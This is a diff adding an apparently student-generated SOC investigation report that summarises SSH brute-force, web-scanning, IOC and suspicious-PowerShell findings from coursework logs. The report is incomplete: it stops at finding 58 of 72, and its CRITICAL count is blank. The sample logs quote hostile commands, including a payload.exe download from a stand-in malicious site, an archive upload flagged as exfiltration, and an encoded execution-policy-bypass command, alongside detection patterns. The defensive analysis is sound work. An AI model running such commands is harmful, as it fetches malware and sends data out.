@@ -1,0 +1,771 @@
+﻿======================================================================
+ SECURITY INVESTIGATION REPORT
+ Advanced Scripting COMPH2705 - SOC Analysis Tool
+======================================================================
+ Analyst   : B00172277
+ Generated : 2026-03-25 09:41:45
+ Log Sources Analysed:
+   - ProjectDataset/access.log
+   - ProjectDataset/auth.log
+   - ProjectDataset/powershell_log.txt
+   - ProjectDataset/ioc.txt
+======================================================================
+
+EXECUTIVE SUMMARY
+----------------------------------------------------------------------
+ Overall Risk Level : HIGH
+ Total Findings     : 72
+   CRITICAL : 
+   HIGH     : 11
+   MEDIUM   : 18
+   LOW      : 42
+
+ SUMMARY OF FINDINGS:
+   [47] Brute Force SSH
+   [2] IOC - Malicious IP
+   [3] IOC - Suspicious Path
+   [6] Suspicious PowerShell
+   [1] Data Exfiltration Chain
+   [13] Web Scanning - High Request Volume
+
+======================================================================
+ DETAILED FINDINGS
+======================================================================
+
+[1] Data Exfiltration Chain
+----------------------------------------------------------------------
+ Severity : CRITICAL
+ Pattern      : Compress-Archive -> Invoke-WebRequest -Upload
+ Description  : Data archiving followed by web upload - likely exfiltration
+ HitCount     : 1
+ Sample Log  :
+   2025-02-01 10:05:33 powershell.exe -Command Compress-Archive C:\Users\student\Documents\data.zip2025-02-01 10:06:21 powershell.exe -Command Invoke-WebRequest -Upload data.zip
+
+[2] Web Scanning - High Request Volume
+----------------------------------------------------------------------
+ Severity : HIGH
+ SourceIP     : 10.211.47.159
+ HitCount     : 17034
+ Sample Log  :
+   10.211.47.159 - - [09/Aug/2009:19:31:51 -0700] "GET / HTTP/1.1" 200 7616
+   10.211.47.159 - - [09/Aug/2009:19:31:57 -0700] "GET /assets/css/the-associates.css HTTP/1.1" 304 -
+   10.211.47.159 - - [09/Aug/2009:19:31:57 -0700] "GET /assets/js/lowpro.js HTTP/1.1" 304 -
+
+[3] Web Scanning - High Request Volume
+----------------------------------------------------------------------
+ Severity : HIGH
+ SourceIP     : 10.153.239.5
+ HitCount     : 547
+ Sample Log  :
+   10.153.239.5 - - [28/Jul/2009:18:11:23 -0700] "GET / HTTP/1.1" 200 7616
+   10.153.239.5 - - [28/Jul/2009:18:11:24 -0700] "GET /assets/js/lowpro.js HTTP/1.1" 200 10469
+   10.153.239.5 - - [28/Jul/2009:18:11:24 -0700] "GET /assets/css/reset.css HTTP/1.1" 200 1014
+
+[4] Web Scanning - High Request Volume
+----------------------------------------------------------------------
+ Severity : HIGH
+ SourceIP     : 10.216.113.172
+ HitCount     : 31341
+ Sample Log  :
+   10.216.113.172 - - [16/Jul/2009:02:51:28 -0700] "GET / HTTP/1.1" 200 7616
+   10.216.113.172 - - [16/Jul/2009:02:51:29 -0700] "GET /assets/js/lowpro.js HTTP/1.1" 200 10469
+   10.216.113.172 - - [16/Jul/2009:02:51:29 -0700] "GET /assets/css/reset.css HTTP/1.1" 200 1014
+
+[5] Suspicious PowerShell
+----------------------------------------------------------------------
+ Severity : HIGH
+ Pattern      : -EncodedCommand
+ Description  : Base64-encoded command execution (obfuscation)
+ HitCount     : 1
+ Sample Log  :
+   2025-02-01 10:02:44 powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...
+
+[6] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : HIGH
+ SourceIP     : 24.151.103.17
+ EventCount   : 157
+ Sample Log  :
+   Mar 29 17:48:33 ip-10-77-20-248 sshd[4988]: Failed password for elastic_user_3 from 24.151.103.17 port 50739 ssh2
+   Mar 29 17:48:33 ip-10-77-20-248 sshd[4988]: Failed password for elastic_user_3 from 24.151.103.17 port 50739 ssh2
+   Mar 29 19:30:18 ip-10-77-20-248 sshd[5743]: Failed password for elastic_user_4 from 24.151.103.17 port 52124 ssh2
+
+[7] Suspicious PowerShell
+----------------------------------------------------------------------
+ Severity : HIGH
+ Pattern      : -ExecutionPolicy\s+Bypass
+ Description  : Execution policy bypass flag
+ HitCount     : 1
+ Sample Log  :
+   2025-02-01 10:02:44 powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...
+
+[8] Web Scanning - High Request Volume
+----------------------------------------------------------------------
+ Severity : HIGH
+ SourceIP     : 10.76.153.132
+ HitCount     : 454
+ Sample Log  :
+   10.76.153.132 - - [17/Dec/2009:06:22:54 -0800] "GET / HTTP/1.1" 200 11981
+   10.76.153.132 - - [17/Dec/2009:06:22:54 -0800] "GET /assets/js/the-associates.js HTTP/1.1" 200 203
+   10.76.153.132 - - [17/Dec/2009:06:22:54 -0800] "GET /assets/css/reset.css HTTP/1.1" 200 1014
+
+[9] Suspicious PowerShell
+----------------------------------------------------------------------
+ Severity : HIGH
+ Pattern      : Invoke-WebRequest.*-Upload
+ Description  : Web upload activity (possible exfiltration)
+ HitCount     : 1
+ Sample Log  :
+   2025-02-01 10:06:21 powershell.exe -Command Invoke-WebRequest -Upload data.zip
+
+[10] IOC - Malicious IP
+----------------------------------------------------------------------
+ Severity : HIGH
+ Indicator    : 198.51.100.8
+ HitCount     : 5
+ Sample Log  :
+   198.51.100.8 - - [15/Jul/2009:15:50:51 -0700] "POST /login HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
+   198.51.100.8 - - [15/Jul/2009:15:50:52 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+   198.51.100.8 - - [15/Jul/2009:15:50:53 -0700] "GET /wp-login.php HTTP/1.1" 200 900 "-" "Mozilla/5.0"
+
+[11] Web Scanning - High Request Volume
+----------------------------------------------------------------------
+ Severity : HIGH
+ SourceIP     : 10.82.30.199
+ HitCount     : 251
+ Sample Log  :
+   10.82.30.199 - - [16/Jul/2009:03:00:06 -0700] "GET / HTTP/1.1" 200 7616
+   10.82.30.199 - - [16/Jul/2009:03:00:06 -0700] "GET /assets/css/960.css HTTP/1.1" 200 6206
+   10.82.30.199 - - [16/Jul/2009:03:00:06 -0700] "GET /assets/css/reset.css HTTP/1.1" 200 1014
+
+[12] IOC - Malicious IP
+----------------------------------------------------------------------
+ Severity : HIGH
+ Indicator    : 203.0.113.5
+ HitCount     : 3
+ Sample Log  :
+   203.0.113.5 - - [15/Jul/2009:15:50:51 -0700] "GET /admin HTTP/1.1" 403 210 "-" "Mozilla/5.0"
+   203.0.113.5 - - [15/Jul/2009:15:50:52 -0700] "GET /phpmyadmin HTTP/1.1" 404 321 "-" "Mozilla/5.0"
+   203.0.113.5 - - [15/Jul/2009:15:50:53 -0700] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 321 "-" "Mozilla/5.0"
+
+[13] Suspicious PowerShell
+----------------------------------------------------------------------
+ Severity : MEDIUM
+ Pattern      : Invoke-WebRequest
+ Description  : Remote web request
+ HitCount     : 3
+ Sample Log  :
+   2025-02-01 10:03:55 powershell.exe -Command Invoke-WebRequest https://microsoft.com/update.exe
+   2025-02-01 10:04:02 powershell.exe -Command Invoke-WebRequest http://malicious-site.com/payload.exe
+   2025-02-01 10:06:21 powershell.exe -Command Invoke-WebRequest -Upload data.zip
+
+[14] IOC - Suspicious Path
+----------------------------------------------------------------------
+ Severity : MEDIUM
+ Indicator    : /wp-admin
+ HitCount     : 3
+ Sample Log  :
+   198.51.100.8 - - [15/Jul/2009:15:50:52 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+   198.51.100.8 - - [15/Jul/2009:15:50:54 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+   198.51.100.8 - - [15/Jul/2009:15:50:55 -0700] "GET /wp-admin HTTP/1.1" 404 532 "-" "Mozilla/5.0"
+
+[15] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : MEDIUM
+ SourceIP     : 201.178.81.113
+ EventCount   : 32
+ Sample Log  :
+   Apr 19 17:12:41 ip-10-77-20-248 sshd[3010]: Failed password for root from 201.178.81.113 port 52350 ssh2
+   Apr 19 17:12:42 ip-10-77-20-248 sshd[3012]: Failed password for invalid user admin from 201.178.81.113 port 52356 ssh2
+   Apr 19 17:12:43 ip-10-77-20-248 sshd[3010]: Failed password for root from 201.178.81.113 port 52350 ssh2
+
+[16] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : MEDIUM
+ SourceIP     : 181.26.186.35
+ EventCount   : 27
+ Sample Log  :
+   Apr  1 18:22:17 ip-10-77-20-248 sshd[22954]: Failed password for invalid user test from 181.26.186.35 port 52373 ssh2
+   Apr  1 18:22:17 ip-10-77-20-248 sshd[22956]: Failed password for invalid user guest from 181.26.186.35 port 52379 ssh2
+   Apr  1 18:22:19 ip-10-77-20-248 sshd[22954]: Failed password for invalid user test from 181.26.186.35 port 52373 ssh2
+
+[17] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : MEDIUM
+ SourceIP     : 122.163.61.218
+ EventCount   : 30
+ Sample Log  :
+   Apr 13 04:25:37 ip-10-77-20-248 sshd[26671]: Failed password for root from 122.163.61.218 port 54996 ssh2
+   Apr 13 04:25:39 ip-10-77-20-248 sshd[26671]: Failed password for root from 122.163.61.218 port 54996 ssh2
+   Apr 13 04:25:39 ip-10-77-20-248 sshd[26673]: Failed password for root from 122.163.61.218 port 55008 ssh2
+
+[18] IOC - Suspicious Path
+----------------------------------------------------------------------
+ Severity : MEDIUM
+ Indicator    : /admin
+ HitCount     : 1
+ Sample Log  :
+   203.0.113.5 - - [15/Jul/2009:15:50:51 -0700] "GET /admin HTTP/1.1" 403 210 "-" "Mozilla/5.0"
+
+[19] IOC - Suspicious Path
+----------------------------------------------------------------------
+ Severity : MEDIUM
+ Indicator    : /phpmyadmin
+ HitCount     : 2
+ Sample Log  :
+   203.0.113.5 - - [15/Jul/2009:15:50:52 -0700] "GET /phpmyadmin HTTP/1.1" 404 321 "-" "Mozilla/5.0"
+   203.0.113.5 - - [15/Jul/2009:15:50:53 -0700] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 321 "-" "Mozilla/5.0"
+
+[20] Suspicious PowerShell
+----------------------------------------------------------------------
+ Severity : MEDIUM
+ Pattern      : Compress-Archive
+ Description  : Archive creation (possible data staging)
+ HitCount     : 1
+ Sample Log  :
+   2025-02-01 10:05:33 powershell.exe -Command Compress-Archive C:\Users\student\Documents\data.zip
+
+[21] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : MEDIUM
+ SourceIP     : 49.4.143.105
+ EventCount   : 40
+ Sample Log  :
+   Apr  5 07:11:17 ip-10-77-20-248 sshd[14711]: Failed password for root from 49.4.143.105 port 1773 ssh2
+   Apr  5 07:11:27 ip-10-77-20-248 sshd[14711]: message repeated 5 times: [ Failed password for root from 49.4.143.105 port 1773 ssh2]
+   Apr  5 07:12:00 ip-10-77-20-248 sshd[14722]: Failed password for root from 49.4.143.105 port 3816 ssh2
+
+[22] Web Scanning - High Request Volume
+----------------------------------------------------------------------
+ Severity : MEDIUM
+ SourceIP     : 10.8.153.248
+ HitCount     : 21
+ Sample Log  :
+   10.8.153.248 - - [25/Nov/2009:01:06:37 -0800] "GET / HTTP/1.1" 200 10733
+   10.8.153.248 - - [25/Nov/2009:01:06:38 -0800] "GET /assets/js/the-associates.js HTTP/1.1" 200 203
+   10.8.153.248 - - [25/Nov/2009:01:06:39 -0800] "GET /assets/css/reset.css HTTP/1.1" 200 1014
+
+[23] Web Scanning - High Request Volume
+----------------------------------------------------------------------
+ Severity : MEDIUM
+ SourceIP     : 10.52.154.222
+ HitCount     : 23
+ Sample Log  :
+   10.52.154.222 - - [10/Dec/2009:10:28:03 -0800] "GET / HTTP/1.1" 200 12001
+   10.52.154.222 - - [10/Dec/2009:10:28:03 -0800] "GET /assets/css/reset.css HTTP/1.1" 200 1014
+   10.52.154.222 - - [10/Dec/2009:10:28:03 -0800] "GET /assets/css/960.css HTTP/1.1" 200 6443
+
+[24] Web Scanning - High Request Volume
+----------------------------------------------------------------------
+ Severity : MEDIUM
+ SourceIP     : 10.223.157.186
+ HitCount     : 115
+ Sample Log  :
+   10.223.157.186 - - [15/Jul/2009:14:58:59 -0700] "GET / HTTP/1.1" 403 202
+   10.223.157.186 - - [15/Jul/2009:14:58:59 -0700] "GET /favicon.ico HTTP/1.1" 404 209
+   10.223.157.186 - - [15/Jul/2009:15:50:35 -0700] "GET / HTTP/1.1" 200 9157
+
+[25] Web Scanning - High Request Volume
+----------------------------------------------------------------------
+ Severity : MEDIUM
+ SourceIP     : 10.17.107.103
+ HitCount     : 53
+ Sample Log  :
+   10.17.107.103 - - [02/Dec/2009:08:02:08 -0800] "GET / HTTP/1.1" 200 11777
+   10.17.107.103 - - [02/Dec/2009:08:02:08 -0800] "GET /assets/css/960.css HTTP/1.1" 200 6443
+   10.17.107.103 - - [02/Dec/2009:08:02:08 -0800] "GET /assets/css/reset.css HTTP/1.1" 200 1014
+
+[26] Web Scanning - High Request Volume
+----------------------------------------------------------------------
+ Severity : MEDIUM
+ SourceIP     : 10.242.156.154
+ HitCount     : 22
+ Sample Log  :
+   10.242.156.154 - - [11/Dec/2009:02:42:36 -0800] "GET / HTTP/1.1" 200 12001
+   10.242.156.154 - - [11/Dec/2009:02:42:37 -0800] "GET /assets/css/960.css HTTP/1.1" 200 6443
+   10.242.156.154 - - [11/Dec/2009:02:42:37 -0800] "GET /assets/css/reset.css HTTP/1.1" 200 1014
+
+[27] Web Scanning - High Request Volume
+----------------------------------------------------------------------
+ Severity : MEDIUM
+ SourceIP     : 10.167.113.116
+ HitCount     : 30
+ Sample Log  :
+   10.167.113.116 - - [02/Dec/2009:08:22:47 -0800] "GET / HTTP/1.1" 200 11777
+   10.167.113.116 - - [02/Dec/2009:08:22:48 -0800] "GET /favicon.ico HTTP/1.1" 404 209
+   10.167.113.116 - - [02/Dec/2009:08:22:48 -0800] "GET /assets/css/reset.css HTTP/1.1" 200 1014
+
+[28] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : MEDIUM
+ SourceIP     : 34.204.227.175
+ EventCount   : 43
+ Sample Log  :
+   Apr  6 20:48:27 ip-10-77-20-248 sshd[16841]: Failed password for invalid user  from 34.204.227.175 port 19074 ssh2
+   Apr  6 20:48:34 ip-10-77-20-248 sshd[16843]: Failed password for invalid user  from 34.204.227.175 port 19546 ssh2
+   Apr  6 20:48:40 ip-10-77-20-248 sshd[16845]: Failed password for invalid user  from 34.204.227.175 port 20758 ssh2
+
+[29] Web Scanning - High Request Volume
+----------------------------------------------------------------------
+ Severity : MEDIUM
+ SourceIP     : 10.130.195.163
+ HitCount     : 21
+ Sample Log  :
+   10.130.195.163 - - [06/Aug/2009:16:41:31 -0700] "GET / HTTP/1.1" 200 7616
+   10.130.195.163 - - [06/Aug/2009:16:41:31 -0700] "GET /assets/js/lowpro.js HTTP/1.1" 200 10469
+   10.130.195.163 - - [06/Aug/2009:16:41:31 -0700] "GET /assets/css/960.css HTTP/1.1" 200 6206
+
+[30] Web Scanning - High Request Volume
+----------------------------------------------------------------------
+ Severity : MEDIUM
+ SourceIP     : 10.207.190.45
+ HitCount     : 36
+ Sample Log  :
+   10.207.190.45 - - [16/Jul/2009:04:14:59 -0700] "GET / HTTP/1.1" 200 7616
+   10.207.190.45 - - [16/Jul/2009:04:14:59 -0700] "GET /favicon.ico HTTP/1.1" 404 209
+   10.207.190.45 - - [16/Jul/2009:04:14:59 -0700] "GET /assets/css/reset.css HTTP/1.1" 200 1014
+
+[31] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 182.243.87.6
+ EventCount   : 6
+ Sample Log  :
+   Apr  6 22:59:12 ip-10-77-20-248 sshd[17002]: Failed password for invalid user admin from 182.243.87.6 port 55300 ssh2
+   Apr  6 22:59:15 ip-10-77-20-248 sshd[17002]: Failed password for invalid user admin from 182.243.87.6 port 55300 ssh2
+   Apr  6 22:59:16 ip-10-77-20-248 sshd[17002]: Failed password for invalid user admin from 182.243.87.6 port 55300 ssh2
+
+[32] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 178.219.248.139
+ EventCount   : 6
+ Sample Log  :
+   Apr 14 05:01:34 ip-10-77-20-248 sshd[27914]: Failed password for invalid user admin from 178.219.248.139 port 3242 ssh2
+   Apr 14 05:01:36 ip-10-77-20-248 sshd[27914]: Failed password for invalid user admin from 178.219.248.139 port 3242 ssh2
+   Apr 14 05:01:38 ip-10-77-20-248 sshd[27914]: Failed password for invalid user admin from 178.219.248.139 port 3242 ssh2
+
+[33] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 85.245.107.41
+ EventCount   : 11
+ Sample Log  :
+   Mar 29 13:07:15 ip-10-77-20-248 sshd[2257]: Failed password for elastic_user_0 from 85.245.107.41 port 51401 ssh2
+   Mar 29 13:41:15 ip-10-77-20-248 sshd[2328]: Failed password for elastic_user_2 from 85.245.107.41 port 51707 ssh2
+   Mar 29 14:43:05 ip-10-77-20-248 sshd[3679]: Failed password for elastic_user_2 from 85.245.107.41 port 52498 ssh2
+
+[34] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 183.93.253.159
+ EventCount   : 6
+ Sample Log  :
+   Apr 13 02:54:54 ip-10-77-20-248 sshd[26628]: Failed password for invalid user admin from 183.93.253.159 port 53186 ssh2
+   Apr 13 02:54:57 ip-10-77-20-248 sshd[26628]: Failed password for invalid user admin from 183.93.253.159 port 53186 ssh2
+   Apr 13 02:54:59 ip-10-77-20-248 sshd[26628]: Failed password for invalid user admin from 183.93.253.159 port 53186 ssh2
+
+[35] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 123.96.5.168
+ EventCount   : 6
+ Sample Log  :
+   Apr  5 23:52:43 ip-10-77-20-248 sshd[15776]: Failed password for invalid user cubrid from 123.96.5.168 port 43885 ssh2
+   Apr  5 23:52:45 ip-10-77-20-248 sshd[15776]: Failed password for invalid user cubrid from 123.96.5.168 port 43885 ssh2
+   Apr  5 23:52:47 ip-10-77-20-248 sshd[15776]: Failed password for invalid user cubrid from 123.96.5.168 port 43885 ssh2
+
+[36] Suspicious PowerShell
+----------------------------------------------------------------------
+ Severity : LOW
+ Pattern      : -NoProfile
+ Description  : NoProfile flag (stealth execution)
+ HitCount     : 1
+ Sample Log  :
+   2025-02-01 10:02:44 powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...
+
+[37] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 93.120.176.237
+ EventCount   : 6
+ Sample Log  :
+   Apr  2 17:03:45 ip-10-77-20-248 sshd[24892]: Failed password for invalid user default from 93.120.176.237 port 50121 ssh2
+   Apr  2 17:03:47 ip-10-77-20-248 sshd[24892]: Failed password for invalid user default from 93.120.176.237 port 50121 ssh2
+   Apr  2 17:03:48 ip-10-77-20-248 sshd[24892]: Failed password for invalid user default from 93.120.176.237 port 50121 ssh2
+
+[38] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 61.166.73.66
+ EventCount   : 6
+ Sample Log  :
+   Apr  5 07:45:27 ip-10-77-20-248 sshd[15010]: Failed password for invalid user webconfig from 61.166.73.66 port 45434 ssh2
+   Apr  5 07:45:29 ip-10-77-20-248 sshd[15010]: Failed password for invalid user webconfig from 61.166.73.66 port 45434 ssh2
+   Apr  5 07:45:31 ip-10-77-20-248 sshd[15010]: Failed password for invalid user webconfig from 61.166.73.66 port 45434 ssh2
+
+[39] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 175.162.187.121
+ EventCount   : 6
+ Sample Log  :
+   Apr 10 19:42:04 ip-10-77-20-248 sshd[23948]: Failed password for invalid user admin from 175.162.187.121 port 24399 ssh2
+   Apr 10 19:42:07 ip-10-77-20-248 sshd[23948]: Failed password for invalid user admin from 175.162.187.121 port 24399 ssh2
+   Apr 10 19:42:09 ip-10-77-20-248 sshd[23948]: Failed password for invalid user admin from 175.162.187.121 port 24399 ssh2
+
+[40] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 46.89.129.145
+ EventCount   : 6
+ Sample Log  :
+   Apr  9 14:57:49 ip-10-77-20-248 sshd[20484]: Failed password for invalid user admin from 46.89.129.145 port 59884 ssh2
+   Apr  9 14:57:52 ip-10-77-20-248 sshd[20484]: Failed password for invalid user admin from 46.89.129.145 port 59884 ssh2
+   Apr  9 14:57:54 ip-10-77-20-248 sshd[20484]: Failed password for invalid user admin from 46.89.129.145 port 59884 ssh2
+
+[41] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 181.25.201.155
+ EventCount   : 8
+ Sample Log  :
+   Mar 30 21:54:04 ip-10-77-20-248 sshd[16330]: Failed password for root from 181.25.201.155 port 49532 ssh2
+   Mar 30 21:54:16 ip-10-77-20-248 sshd[16330]: message repeated 5 times: [ Failed password for root from 181.25.201.155 port 49532 ssh2]
+   Mar 30 21:54:18 ip-10-77-20-248 sshd[16332]: Failed password for invalid user openerp from 181.25.201.155 port 49596 ssh2
+
+[42] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 222.186.56.220
+ EventCount   : 8
+ Sample Log  :
+   Apr 13 01:55:44 ip-10-77-20-248 sshd[26597]: Failed password for invalid user ubnt from 222.186.56.220 port 3490 ssh2
+   Apr 13 01:55:46 ip-10-77-20-248 sshd[26597]: Failed password for invalid user ubnt from 222.186.56.220 port 3490 ssh2
+   Apr 13 01:55:48 ip-10-77-20-248 sshd[26597]: Failed password for invalid user ubnt from 222.186.56.220 port 3490 ssh2
+
+[43] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 179.38.76.250
+ EventCount   : 6
+ Sample Log  :
+   Apr 19 04:37:49 ip-10-77-20-248 sshd[2441]: Failed password for invalid user admin from 179.38.76.250 port 48248 ssh2
+   Apr 19 04:37:52 ip-10-77-20-248 sshd[2441]: Failed password for invalid user admin from 179.38.76.250 port 48248 ssh2
+   Apr 19 04:37:54 ip-10-77-20-248 sshd[2441]: Failed password for invalid user admin from 179.38.76.250 port 48248 ssh2
+
+[44] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 103.230.120.26
+ EventCount   : 6
+ Sample Log  :
+   Apr  9 16:50:57 ip-10-77-20-248 sshd[20549]: Failed password for invalid user user1 from 103.230.120.26 port 33124 ssh2
+   Apr  9 16:50:59 ip-10-77-20-248 sshd[20549]: Failed password for invalid user user1 from 103.230.120.26 port 33124 ssh2
+   Apr  9 16:51:01 ip-10-77-20-248 sshd[20549]: Failed password for invalid user user1 from 103.230.120.26 port 33124 ssh2
+
+[45] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 123.153.146.183
+ EventCount   : 6
+ Sample Log  :
+   Apr  1 18:08:16 ip-10-77-20-248 sshd[22932]: Failed password for invalid user admin from 123.153.146.183 port 19919 ssh2
+   Apr  1 18:08:19 ip-10-77-20-248 sshd[22932]: Failed password for invalid user admin from 123.153.146.183 port 19919 ssh2
+   Apr  1 18:08:21 ip-10-77-20-248 sshd[22932]: Failed password for invalid user admin from 123.153.146.183 port 19919 ssh2
+
+[46] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 14.54.210.101
+ EventCount   : 12
+ Sample Log  :
+   Apr 13 07:23:18 ip-10-77-20-248 sshd[26895]: Failed password for root from 14.54.210.101 port 58480 ssh2
+   Apr 13 07:23:18 ip-10-77-20-248 sshd[26897]: Failed password for root from 14.54.210.101 port 58483 ssh2
+   Apr 13 07:23:20 ip-10-77-20-248 sshd[26895]: Failed password for root from 14.54.210.101 port 58480 ssh2
+
+[47] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 111.40.30.206
+ EventCount   : 6
+ Sample Log  :
+   Apr  6 02:28:25 ip-10-77-20-248 sshd[15853]: Failed password for invalid user admin from 111.40.30.206 port 37417 ssh2
+   Apr  6 02:28:27 ip-10-77-20-248 sshd[15853]: Failed password for invalid user admin from 111.40.30.206 port 37417 ssh2
+   Apr  6 02:28:30 ip-10-77-20-248 sshd[15853]: Failed password for invalid user admin from 111.40.30.206 port 37417 ssh2
+
+[48] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 119.193.140.176
+ EventCount   : 6
+ Sample Log  :
+   Apr  3 22:52:29 ip-10-77-20-248 sshd[7626]: Failed password for invalid user ubnt from 119.193.140.176 port 49492 ssh2
+   Apr  3 22:52:31 ip-10-77-20-248 sshd[7626]: Failed password for invalid user ubnt from 119.193.140.176 port 49492 ssh2
+   Apr  3 22:52:34 ip-10-77-20-248 sshd[7626]: Failed password for invalid user ubnt from 119.193.140.176 port 49492 ssh2
+
+[49] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 58.19.144.50
+ EventCount   : 6
+ Sample Log  :
+   Apr  3 22:53:15 ip-10-77-20-248 sshd[7628]: Failed password for invalid user ems from 58.19.144.50 port 49743 ssh2
+   Apr  3 22:53:16 ip-10-77-20-248 sshd[7628]: Failed password for invalid user ems from 58.19.144.50 port 49743 ssh2
+   Apr  3 22:53:20 ip-10-77-20-248 sshd[7628]: Failed password for invalid user ems from 58.19.144.50 port 49743 ssh2
+
+[50] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 122.190.143.18
+ EventCount   : 6
+ Sample Log  :
+   Apr  8 00:33:33 ip-10-77-20-248 sshd[18369]: Failed password for invalid user admin from 122.190.143.18 port 44955 ssh2
+   Apr  8 00:33:36 ip-10-77-20-248 sshd[18369]: Failed password for invalid user admin from 122.190.143.18 port 44955 ssh2
+   Apr  8 00:33:38 ip-10-77-20-248 sshd[18369]: Failed password for invalid user admin from 122.190.143.18 port 44955 ssh2
+
+[51] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 46.30.160.83
+ EventCount   : 6
+ Sample Log  :
+   Apr 14 08:38:36 ip-10-77-20-248 sshd[28479]: Failed password for invalid user ubnt from 46.30.160.83 port 48477 ssh2
+   Apr 14 08:38:38 ip-10-77-20-248 sshd[28479]: Failed password for invalid user ubnt from 46.30.160.83 port 48477 ssh2
+   Apr 14 08:38:40 ip-10-77-20-248 sshd[28479]: Failed password for invalid user ubnt from 46.30.160.83 port 48477 ssh2
+
+[52] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 181.25.189.115
+ EventCount   : 6
+ Sample Log  :
+   Apr 14 04:15:24 ip-10-77-20-248 sshd[27887]: Failed password for invalid user admin from 181.25.189.115 port 54096 ssh2
+   Apr 14 04:15:27 ip-10-77-20-248 sshd[27887]: Failed password for invalid user admin from 181.25.189.115 port 54096 ssh2
+   Apr 14 04:15:30 ip-10-77-20-248 sshd[27887]: Failed password for invalid user admin from 181.25.189.115 port 54096 ssh2
+
+[53] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 82.64.2.59
+ EventCount   : 6
+ Sample Log  :
+   Mar 31 14:15:40 ip-10-77-20-248 sshd[20589]: Failed password for invalid user pi from 82.64.2.59 port 38450 ssh2
+   Mar 31 14:15:42 ip-10-77-20-248 sshd[20589]: Failed password for invalid user pi from 82.64.2.59 port 38450 ssh2
+   Mar 31 14:15:44 ip-10-77-20-248 sshd[20589]: Failed password for invalid user pi from 82.64.2.59 port 38450 ssh2
+
+[54] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 112.251.168.248
+ EventCount   : 6
+ Sample Log  :
+   Apr  3 14:51:37 ip-10-77-20-248 sshd[7192]: Failed password for invalid user admin from 112.251.168.248 port 26247 ssh2
+   Apr  3 14:51:39 ip-10-77-20-248 sshd[7192]: Failed password for invalid user admin from 112.251.168.248 port 26247 ssh2
+   Apr  3 14:51:42 ip-10-77-20-248 sshd[7192]: Failed password for invalid user admin from 112.251.168.248 port 26247 ssh2
+
+[55] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 78.106.21.86
+ EventCount   : 6
+ Sample Log  :
+   Apr  2 19:51:57 ip-10-77-20-248 sshd[25073]: Failed password for invalid user admin from 78.106.21.86 port 36308 ssh2
+   Apr  2 19:51:59 ip-10-77-20-248 sshd[25073]: Failed password for invalid user admin from 78.106.21.86 port 36308 ssh2
+   Apr  2 19:52:01 ip-10-77-20-248 sshd[25073]: Failed password for invalid user admin from 78.106.21.86 port 36308 ssh2
+
+[56] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 125.107.136.165
+ EventCount   : 6
+ Sample Log  :
+   Apr  6 14:19:18 ip-10-77-20-248 sshd[16658]: Failed password for invalid user pi from 125.107.136.165 port 33435 ssh2
+   Apr  6 14:19:20 ip-10-77-20-248 sshd[16658]: Failed password for invalid user pi from 125.107.136.165 port 33435 ssh2
+   Apr  6 14:19:22 ip-10-77-20-248 sshd[16658]: Failed password for invalid user pi from 125.107.136.165 port 33435 ssh2
+
+[57] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 122.189.198.238
+ EventCount   : 6
+ Sample Log  :
+   Mar 31 01:35:16 ip-10-77-20-248 sshd[17262]: Failed password for invalid user admin from 122.189.198.238 port 43749 ssh2
+   Mar 31 01:35:18 ip-10-77-20-248 sshd[17262]: Failed password for invalid user admin from 122.189.198.238 port 43749 ssh2
+   Mar 31 01:35:21 ip-10-77-20-248 sshd[17262]: Failed password for invalid user admin from 122.189.198.238 port 43749 ssh2
+
+[58] Brute Force SSH
+----------------------------------------------------------------------
+ Severity : LOW
+ SourceIP     : 61.183.117.250
+ EventCount   : 6
+ Sample Log  :
